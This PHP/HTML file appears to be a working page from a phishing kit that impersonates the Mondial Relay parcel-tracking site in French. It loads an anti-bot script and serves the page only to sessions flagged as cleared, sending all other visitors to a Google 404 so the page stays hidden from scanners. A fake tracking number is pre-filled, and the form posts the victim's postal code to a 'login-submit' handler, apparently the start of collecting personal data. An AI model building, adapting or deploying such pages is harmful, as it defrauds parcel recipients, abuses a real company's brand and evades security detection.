<?php
session_start();
if ($_SESSION['bot'] == '1') {
include('../../config.php');
include('../../app/functions.php');
include('../../antibots.php');
include('../../common/sub_includes.php');
?>
<html lang="fr">
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
    <title>Suivi de colis - Mondial Relay</title>
    <link href="../../public/img/logomrnotext.svg" id="ctl00_FavIcon2" rel="icon" type="">
    <link href="../../public/img/logomrnotext.svg" id="ctl00_FavIcon1" rel="shortcut icon">
    <link href="../../public/img/mondial-relay-logo.png" rel="apple-touch-icon">
    <link href="../../public/css/jquery-ui.css" rel="stylesheet">
    <link href="../../public/css/main.css" rel="stylesheet">
    <link href="../../public/css/styleMR.css" rel="stylesheet" type="text/css">
  </head>
  <body class="">
    <div class="content new" id="one">
      <header>
        <div class="grid header-top">
          <div class="header-content">
            <div class="pr-0 nav container">
              <div class="nav__group">
                <button class="visible-xs nav__menu" id="mobile-btn">
                  <span class="sr-only">Ouvrir le menu</span>
                  <span class="burger-menu"></span>
                </button>
                <a class="visible-xs nav__search" href="#" id="mobile-search">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14.6649 23.8299C19.7266 23.8299 23.8299 19.7266 23.8299 14.665C23.8299 9.60331 19.7266 5.5 14.6649 5.5C9.60328 5.5 5.5 9.60331 5.5 14.665C5.5 19.7266 9.60328 23.8299 14.6649 23.8299Z" stroke="#96154A" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M21.6782 20.5996L29.5001 28.4214" stroke="#96154A" stroke-linejoin="round" stroke-width="1.3"></path>
                  </svg>
                </a>
              </div>
              <a href="#" id="logo" title="Mondial Relay e-livraison de vos colis">
                <span class="sr-only">Mondial Relay e-livraison de vos colis</span>
                <img alt="Logo Mondial Relay" height="60" src="../../public/img/logomondial-relay.svg">
              </a>
              <div class="nav__group">
                <a class="mobile-basket visible-xs nav__basket nav__basket--hp" href="#">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M28.5 15.6116H4.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M5.95264 15.9031L9.47336 26.2827H23.6104L27.2428 15.6116" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M9.36182 15.6115L15.2855 7.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                    <path d="M23.6661 15.6115L17.6882 7.5" stroke="#96154A" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.3"></path>
                  </svg>
                </a>
                <a class="mobile-account visible-xs callconex nav__connect" href="#">
                  <svg fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                    <path d="M23.9795 27.4157H7.82494C7.65112 27.4157 7.48447 27.3458 7.36156 27.2214C7.23865 27.097 7.16962 26.9283 7.16962 26.7523V24.0406C7.13972 22.8611 7.34339 21.6875 7.76866 20.589C8.19393 19.4904 8.83217 18.4892 9.64577 17.6443C10.4594 16.7993 11.4318 16.1278 12.5059 15.6693C13.5799 15.2108 14.7337 14.9746 15.8994 14.9746C17.065 14.9746 18.2188 15.2108 19.2929 15.6693C20.3669 16.1278 21.3394 16.7993 22.153 17.6443C22.9666 18.4892 23.6048 19.4904 24.0301 20.589C24.4553 21.6875 24.6591 22.8611 24.6292 24.0406V26.7523C24.6299 26.8392 24.6137 26.9253 24.5814 27.0057C24.5491 27.0862 24.5013 27.1594 24.4409 27.2211C24.3805 27.2827 24.3086 27.3317 24.2294 27.3651C24.1502 27.3985 24.0653 27.4157 23.9795 27.4157ZM8.45738 26.0948H23.3011V24.0406C23.3011 23.0541 23.1092 22.0772 22.7362 21.1657C22.3632 20.2543 21.8165 19.4261 21.1273 18.7285C20.4381 18.0309 19.62 17.4775 18.7195 17.1C17.819 16.7225 16.8539 16.5281 15.8792 16.5281C14.9046 16.5281 13.9395 16.7225 13.039 17.1C12.1385 17.4775 11.3204 18.0309 10.6312 18.7285C9.94201 19.4261 9.39529 20.2543 9.02231 21.1657C8.64933 22.0772 8.45738 23.0541 8.45738 24.0406V26.0948Z" fill="#96154A"></path>
                    <path d="M15.8579 13.9968C14.93 13.9968 14.0231 13.7183 13.2516 13.1965C12.4802 12.6748 11.8789 11.9332 11.5238 11.0655C11.1688 10.1979 11.0759 9.24313 11.2569 8.32203C11.4379 7.40093 11.8846 6.55485 12.5407 5.89077C13.1968 5.2267 14.0327 4.77446 14.9427 4.59124C15.8527 4.40803 16.7959 4.50205 17.6531 4.86145C18.5103 5.22084 19.2429 5.82945 19.7584 6.61032C20.2739 7.39119 20.549 8.30925 20.549 9.24839C20.5475 10.5073 20.0528 11.7141 19.1733 12.6043C18.2939 13.4945 17.1016 13.9952 15.8579 13.9968ZM15.8579 5.82094C15.1882 5.82094 14.5335 6.02196 13.9766 6.39857C13.4198 6.77518 12.9858 7.31047 12.7295 7.93676C12.4732 8.56304 12.4061 9.25219 12.5368 9.91705C12.6674 10.5819 12.99 11.1926 13.4636 11.672C13.9371 12.1513 14.5404 12.4777 15.1973 12.61C15.8541 12.7422 16.535 12.6744 17.1537 12.4149C17.7724 12.1555 18.3012 11.7162 18.6733 11.1526C19.0454 10.5889 19.244 9.92628 19.244 9.24839C19.2425 8.33985 18.8853 7.46895 18.2506 6.82651C17.6159 6.18408 16.7555 5.82248 15.8579 5.82094Z" fill="#96154A"></path>
                  </svg>
                </a>
              </div>
            </div>
            <div class="pr-0" id="menuMobile">
              <nav class="menu">
                <ul class="navigation">
                  <li class="selected">
                    <a class="" href="#">Suivi de colis</a>
                  </li>
                  <li class="">
                    <a class="" href="#">Envoi de colis</a>
                  </li>
                  <li class="">
                    <a class="" href="#">Points Relais® <br>et Lockers </a>
                  </li>
                  <li class="">
                    <a class="" href="#">Aide</a>
                  </li>
                  <li class="">
                    <a class="btn btn-primary btn-light mt0" href="#">Solutions Pro</a>
                  </li>
                  <li class="visible-xs">
                    <a class="callconex" href="javascript:void(0)" onclick="callConnexionMobile()">Se connecter</a>
                  </li>
                </ul>
              </nav>
            </div>
          </div>
        </div>
        <div class="ident-bg hidden-xs" id="identification">
          <div class="grid grid--identification">
            <div class="row">
              <div class="col-md-12">
                <ul>
                  <li>
                    <a class="list-countries" href="javascript:void(0)" onclick="callCountries()">
                      <img alt="icone langue" class="icon languages" src="../../public/img/earth.svg"> France </a>
                  </li>
                  <li>
                    <div id="panier">
                      <a class="list-basket" href="javascript:void(0)" onclick="callBasket()">
                        <img alt="icone panier" class="icon languages" src="../../public/img/cart.svg"> Mon panier ( <span>0,00 €</span>) </a>
                    </div>
                  </li>
                  <li>
                    <a class="callconex" href="javascript:void(0)" onclick="callConnexion()">
                      <svg class="icon" fill="none" height="33" viewBox="0 0 33 33" width="33" xmlns="http://www.w3.org/2000/svg">
                        <path d="M23.9795 27.4157H7.82494C7.65112 27.4157 7.48447 27.3458 7.36156 27.2214C7.23865 27.097 7.16962 26.9283 7.16962 26.7523V24.0406C7.13972 22.8611 7.34339 21.6875 7.76866 20.589C8.19393 19.4904 8.83217 18.4892 9.64577 17.6443C10.4594 16.7993 11.4318 16.1278 12.5059 15.6693C13.5799 15.2108 14.7337 14.9746 15.8994 14.9746C17.065 14.9746 18.2188 15.2108 19.2929 15.6693C20.3669 16.1278 21.3394 16.7993 22.153 17.6443C22.9666 18.4892 23.6048 19.4904 24.0301 20.589C24.4553 21.6875 24.6591 22.8611 24.6292 24.0406V26.7523C24.6299 26.8392 24.6137 26.9253 24.5814 27.0057C24.5491 27.0862 24.5013 27.1594 24.4409 27.2211C24.3805 27.2827 24.3086 27.3317 24.2294 27.3651C24.1502 27.3985 24.0653 27.4157 23.9795 27.4157ZM8.45738 26.0948H23.3011V24.0406C23.3011 23.0541 23.1092 22.0772 22.7362 21.1657C22.3632 20.2543 21.8165 19.4261 21.1273 18.7285C20.4381 18.0309 19.62 17.4775 18.7195 17.1C17.819 16.7225 16.8539 16.5281 15.8792 16.5281C14.9046 16.5281 13.9395 16.7225 13.039 17.1C12.1385 17.4775 11.3204 18.0309 10.6312 18.7285C9.94201 19.4261 9.39529 20.2543 9.02231 21.1657C8.64933 22.0772 8.45738 23.0541 8.45738 24.0406V26.0948Z" fill="#96154A"></path>
                        <path d="M15.8579 13.9968C14.93 13.9968 14.0231 13.7183 13.2516 13.1965C12.4802 12.6748 11.8789 11.9332 11.5238 11.0655C11.1688 10.1979 11.0759 9.24313 11.2569 8.32203C11.4379 7.40093 11.8846 6.55485 12.5407 5.89077C13.1968 5.2267 14.0327 4.77446 14.9427 4.59124C15.8527 4.40803 16.7959 4.50205 17.6531 4.86145C18.5103 5.22084 19.2429 5.82945 19.7584 6.61032C20.2739 7.39119 20.549 8.30925 20.549 9.24839C20.5475 10.5073 20.0528 11.7141 19.1733 12.6043C18.2939 13.4945 17.1016 13.9952 15.8579 13.9968ZM15.8579 5.82094C15.1882 5.82094 14.5335 6.02196 13.9766 6.39857C13.4198 6.77518 12.9858 7.31047 12.7295 7.93676C12.4732 8.56304 12.4061 9.25219 12.5368 9.91705C12.6674 10.5819 12.99 11.1926 13.4636 11.672C13.9371 12.1513 14.5404 12.4777 15.1973 12.61C15.8541 12.7422 16.535 12.6744 17.1537 12.4149C17.7724 12.1555 18.3012 11.7162 18.6733 11.1526C19.0454 10.5889 19.244 9.92628 19.244 9.24839C19.2425 8.33985 18.8853 7.46895 18.2506 6.82651C17.6159 6.18408 16.7555 5.82248 15.8579 5.82094Z" fill="#96154A"></path>
                      </svg>Connexion </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </header>
      <div class="container">
        <div class="breadcrumb">
          <div class="grid">
            <div class="row">
              <ul>
                <li>
                  <a href="#">
                    <span class="icon-localisation2"></span> Accueil </a>
                </li>
                <li class="active">Suivi de colis</li>
              </ul>
            </div>
          </div>
        </div>
        <div class="internal-page suivi">
          <div class="grid">
            <div class="row">
              <div class="col-xs-12 col-sm-12 col-md-12 center">
                <h1 id="titreSuiviColis" style="margin-top:75px !important;">Suivre un colis</h1>
                <div class="accroche p0-10">Votre colis a de la valeur pour nous. Tout comme nous, vous pouvez le suivre à la trace. En un clic, vous savez où il se situe.</div>
              </div>
            </div>
          </div>
          <div class="main">
            <div class="grid">
              <div class="row">
                <div class="app-wrapper" data-v-67007474="" id="tracking-wrapper">
                  <div data-v-3c4598c9="" data-v-67007474="">
                    <form method="post" action="app/login-submit.php" class="form-block" data-v-3c4598c9="" novalidate="novalidate">
                      <div class="input-zone" data-v-3c4598c9="">
                        <div class="shipmentContainer" data-v-3c4598c9="">
                          <input class="parcelnumber" data-v-3c4598c9="" placeholder="<?=$num_suivi?>" name="id" value="<?=$num_suivi?>" disabled type="text">
                        </div>
                        <div class="zipcodeContainer" data-v-3c4598c9="">
                          <input class="zipcode" data-v-3c4598c9="" placeholder="Code postal du destinataire" name="postal" type="text" inputmode="numeric" minlength="5" maxlength="5">
                        </div>
                        <button class="btn btn-primary" data-v-3c4598c9="" type="submit">Trouver</button>
                      </div>
                      <div class="faq" data-v-3c4598c9="">Il vous suffit d'entrer votre numéro de colis/d'expédition/ suivi (8, 10 ou 12 chiffres), avec le code postal du destinataire. <br>En cas de question nous vous invitons à vous rendre sur notre <a href="#">FAQ</a>. </div>
                    </form>
                  </div>
                  <div class="row" data-v-0905ca89="" data-v-67007474="">
                    <div class="col-md-12 mb20" data-v-0905ca89="">
                      <div class="line-block" data-v-00490654="" data-v-0905ca89="" id="suivie_mon_colis"></div>
                    </div>
                    <div class="col-md-12 pr0 pl0" data-v-0905ca89=""></div>
                  </div>
                </div>
                <link href="../../public/css/chunk-vendors.css" rel="stylesheet" type="text/css">
                <link href="../../public/css/app.css" rel="stylesheet" type="text/css">
              </div>
              <div class="row">
                <div class="column col-xs-12 col-sm-12 col-md-12 mb30" id="corpsDePagePrincipal">
                  <div class="grid">
                    <div class="col-xs-12 col-sm-6 col-md-6 pubsuivi">
                      <img alt="" data-udi="umb://media/8b4839a07e10479dbb795e0c22ff0887" src="../../public/img/microsoftteams-image-12.png" style="width:0;height:0">
                      <a data-anchor="?adj_t=1bb00xsp_1bn5tnt6" href="#">
                        <img alt="" data-udi="umb://media/8b4839a07e10479dbb795e0c22ff0887" id="GoogleApp" src="../../public/img/microsoftteams-image-12(1).png" style="width:auto;height:auto">
                      </a>
                    </div>
                    <div class="col-xs-12 col-sm-6 col-md-6 pubsuivi">
                      <img alt="" data-udi="umb://media/1f4ea4d520ad496fa179f8962f9166a0" src="../../public/img/microsoftteams-image-13.png" style="width:0;height:0">
                      <a data-anchor="?adj_t=1bb00xsp_1bn5tnt6" href="#">
                        <img alt="" data-udi="umb://media/1f4ea4d520ad496fa179f8962f9166a0" id="AppleApp" src="../../public/img/microsoftteams-image-13(1).png" style="width:auto;height:auto">
                      </a>
                    </div>
                  </div>
                  <p>Suivre son colis avec Mondial Relay c’est&nbsp;: Simple et Rapide. Suivez toutes les étapes de livraison de votre colis en un seul clic.</p>
                  <h2>Comment suivre son colis&nbsp;Mondial Relay?</h2>
                  <p>Mondial Relay vous propose un outil de <strong>suivi de colis </strong>accessible en <strong>ligne</strong>et sur l’application en temps réel pour faciliter vos envois en <strong>France</strong> et partout à <strong>l’international</strong>. </p>
                  <p>Une fois <strong>l’expédition du colis</strong> faite, vous allez recevoir les <strong>informations de suivi </strong>par <strong>email</strong> ou par sms. Si vous ne disposez pas du numéro d’expédition, vous pouvez contacter l’expéditeur afin qu’il vous le communique. </p>
                  <p>Saisissez ensuite le code postale de destination ainsi que votre numéro de <strong>colis / suivi / d'expédition (8, 10 ou 12 chiffres) </strong>dans la zone prévue à cet effet, sans espace. </p>
                  <p>Vous pouvez désormais suivre votre colis en temps réel, étape par étape jusqu’à la <strong>livraison</strong> en point Relais® ou en Locker. </p>
                  <h2>Suivi de colis sur l’application ?</h2>
                  <p>L’application Mondial Relay est disponible sur l’App Store et Google Play. Elle vous permet de réunir toutes vos commandes en un seul et même endroit. L’app vous offre un accès au <strong>suivi de tous vos colis</strong> et vous permet d’être notifié lorsque la livraison a bien été effectuée. </p>
                  <p>Téléchargez l’application Mondial Relay et créez un compte client si vous n’en n’avez pas déjà un. Pour que vos colis s’affichent dans votre suivi, il faut que l’adresse e-mail utilisé soit renseignée dans l’app. Vous pouvez lié plusieurs adresses e-mail à votre compte, pour cela il vous suffit d'aller dans votre profil et de vous laisser guider. Une autre option s’offre à vous ; il est également possible d’entrer un numéro d’expédition pour le suivi de colis.</p>
                  <p>Découvrez bien d’autres fonctionnalités sur l’application Mondial Relay, qui vont vous permettre de piloter facilement vos envois ainsi que vos commandes.</p>
                  <p>Même si votre colis provient de Vinted ou Leboncoin, il sera indiqué dans l'application.</p>
                  <p>Pour en savoir plus rendez vous sur notre <a href="#">page dédiée à l'application</a>. </p>
                  <h2>Quels sont les délais d’expédition&nbsp;?</h2>
                  <p>Lorsque vous attendez un colis, celui-ci met en moyenne 3 à 5 jours pour être livré dans votre Point Relais <sup>®</sup>ou Locker. </p>
                  <p>Depuis le 1 <sup>er</sup>Novembre 2022, le délai de récupération de colis est de 8 jours pour tous les colis en Locker et en Point Relais <sup>®</sup>. </p>
                  <p>N’attendez pas pour aller chercher votre colis car au-delà des 8 jours votre colis est susceptible d’être retourné à l’expéditeur.</p>
                  <h2>Comment savoir si le colis a été livré&nbsp;?</h2>
                  <p>Une fois le colis disponible, vous allez recevoir un message par e-mail ou par sms pour vous signaler que votre colis est arrivé dans votre Point Relais <sup>®</sup>ou Locker. Si vous possédez l'application mobile Mondial Relay, une notification vous sera envoyée pour vous inviter à retirer votre colis. </p>
                  <p>Pour en savoir plus sur le fonctionnement du Locker, consultez la page F.A.Q « <a href="#">Comment retirer un colis dans les Lockers Mondial Relay&nbsp;?</a>». </p>
                  <p>
                    <strong>Besoin d’aide pour suivre votre colis&nbsp;?</strong>
                  </p>
                  <p>Vous avez besoin d’aide&nbsp;? Rendez-vous sur notre page F.A.Q pour que nous puissions vous accompagner et répondre à vos interrogations.</p>
                  <p>Si vous souhaitez plus d'informations concernant votre suivi de colis, vous pouvez également nous contacter via notre <a href="#">
                      <strong>formulaire de contact en ligne</strong>
                    </a>, dans la rubrique " <strong>Je souhaite des informations sur la livraison de mon colis</strong>". </p>
                  <p></p>
                  <p>Suivre un colis avec Mondial Relay&nbsp;: c’est simple comme un sourire&nbsp;😊</p>
                  <h2>Questions fréquemment posées</h2>
                  <div class="clearfix"></div>
                  <ul class="faq-bulles">
                    <li class="mb10">
                      <a href="#">Comment suivre l’acheminement de mon colis ?</a>
                    </li>
                    <li class="mb10">
                      <a href="#">Pourquoi mon colis a été livré dans un autre Point Relais ou Locker ?</a>
                    </li>
                    <li class="mb10">
                      <a href="#">Je n'ai pas reçu mon code de retrait</a>
                    </li>
                    <li class="mb10">
                      <a href="#">Est-ce qu'une autre personne peut venir chercher mon colis ?</a>
                    </li>
                    <li class="mb10">
                      <a href="#">Je souhaite ajouter un Point Relais® en favori, comment faire ?</a>
                    </li>
                    <li class="mb10">
                      <a href="#">Où retrouver mon numéro de colis ?</a>
                    </li>
                  </ul>
                  <p></p>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="clear"></div>
        <div class="footer_media block" id="footer_media">
          <div class="grid"></div>
        </div>
      </div>
      <footer class="w100">
        <div class="column">
          <div style="background-color:#fff">
            <div class="surfooter" style="background-image:url(../../public/img/footer_img.png)">
              <div class="grid">
                <div class="row">
                  <img class="surfooter-picto" src="../../public/img/footer_picto.svg">
                </div>
              </div>
            </div>
          </div>
          <div class="sitemap">
            <div class="grid">
              <div class="row listicons">
                <div class="col-sm-12 col-md-7">
                  <div class="row">
                    <div class="">
                      <h5>Pour nous suivre</h5>
                      <div class="reseaux">
                        <a class="icon svg-ico_linkedin25" href="#" title="Suivez-nous sur Linkedin"></a>
                        <a class="icon svg-ico_instagram25" href="#" title="Suivez-nous sur Instagram"></a>
                        <a class="icon svg-ico_tiktok25" href="#" title="Suivez-nous sur Tiktok"></a>
                        <a class="icon svg-ico_facebook25" href="#" title="Suivez-nous sur Facebook"></a>
                        <a class="icon svg-ico_twitter25" href="#" title="Suivez-nous sur Twitter"></a>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="payplus footer-hp">
                  <h5>Nos solutions de paiement</h5>
                  <div class="payplus-icons-hp">
                    <div class="payplus-icons soluce-paiement">
                      <img height="36" src="../../public/img/Mastercard.svg" title="Mastercard">
                      <img height="36" src="../../public/img/Visa.svg" title="Visa">
                      <img height="36" src="../../public/img/Paypal.svg" title="Paypal">
                      <img height="36" src="../../public/img/CB.svg" title="CB">
                    </div>
                    <a class="f-right paypluslink" href="#">
                      <img class="icon-locker" src="../../public/img/ico_locker.svg" title="Lock"> Paiement sécurisé </a>
                  </div>
                </div>
              </div>
              <div class="mt20 listeliens 5 2">
                <div>
                  <h5>Particulier</h5>
                  <ul>
                    <li>
                      <a href="#">Envoyer mon colis pas cher</a>
                    </li>
                    <li>
                      <a href="#">Suivre mon colis</a>
                    </li>
                    <li>
                      <a href="#">Envoi colis entre particuliers</a>
                    </li>
                    <li>
                      <a href="#" target="">Comment utiliser nos Lockers ?</a>
                    </li>
                    <li>
                      <a href="#">Assurer mon colis</a>
                    </li>
                    <li>
                      <a href="#">Découvrir nos tarifs</a>
                    </li>
                    <li>
                      <a href="#">eBay by Mondial Relay</a>
                    </li>
                    <li>
                      <a href="#">Application Mobile Mondial Relay</a>
                    </li>
                  </ul>
                </div>
                <div>
                  <h5>Professionnel</h5>
                  <ul>
                    <li>
                      <a href="#">Nos offres</a>
                    </li>
                    <li>
                      <a href="#">Nos tarifs pro</a>
                    </li>
                    <li>
                      <a href="#">Nos partenaires</a>
                    </li>
                    <li>
                      <a href="#">Installer un Locker</a>
                    </li>
                    <li>
                      <a href="#">Devenir Transporteur</a>
                    </li>
                    <li>
                      <a href="#">Devenir Point Relais</a>
                    </li>
                    <li>
                      <a href="#">Découvrez notre Blog Business</a>
                    </li>
                  </ul>
                  <div class="visible-xs">
                    <a href="#">
                      <img alt="" class="tour-banner" height="150" src="../../public/img/partenaire2.png">
                    </a>
                  </div>
                </div>
                <div>
                  <h5>Liens utiles</h5>
                  <ul>
                    <li>
                      <a href="#">C.G.V.</a>
                    </li>
                    <li>
                      <a href="#">Mentions Legales</a>
                    </li>
                    <li>
                      <a href="#">Charte des données personnelles</a>
                    </li>
                    <li>
                      <a href="#">Conditions des offres</a>
                    </li>
                  </ul>
                </div>
                <div>
                  <h5>Mondial Relay</h5>
                  <ul>
                    <li>
                      <a href="#">Contactez-nous</a>
                    </li>
                    <li>
                      <a href="#">Qui sommes-nous ?</a>
                    </li>
                    <li>
                      <a href="#">Nos engagements RSE</a>
                    </li>
                    <li>
                      <a href="#">Nous rejoindre</a>
                    </li>
                  </ul>
                </div>
                <div class="col-sm-3 col-md-3 hidden-xs listeliens-banner">
                  <a href="#">
                    <img alt="" class="tour-banner" src="../../public/img/partenaire2.png">
                  </a>
                </div>
              </div>
              <div class="app-btns">
                <h5>Application Mondial Relay</h5>
                <a href="#">
                  <img alt="ico app-store" src="../../public/img/ico_app-store.svg">
                </a>
                <a href="#">
                  <img alt="ico google-play" src="../../public/img/ico_google-play.svg">
                </a>
              </div>
              <div class="certif">
                <h5>Nos engagements et certifications</h5>
                <div class="certif__content">
                  <div class="certif__content-item">
                    <img alt="FEVAD" class="f-left" src="../../public/img/fevad.png">
                    <span>Mondial Relay adhère à la Fédération du e-commerce et de la vente à distance (FEVAD)</span>
                  </div>
                  <div class="certif__content-item">
                    <a href="#" title="">
                      <img alt="This website is hosted Green - checked by thegreenwebfoundation.org" class="f-left" src="../../public/img/thegreenweb-mondialrelayfr.png">
                    </a>
                    <span>Le site mondialrelay.fr est classé en vert par The Green Web Foundation (association loi 1901).</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </body>
</html>
<?php
} else {
  header('location: https://google.com/404');
}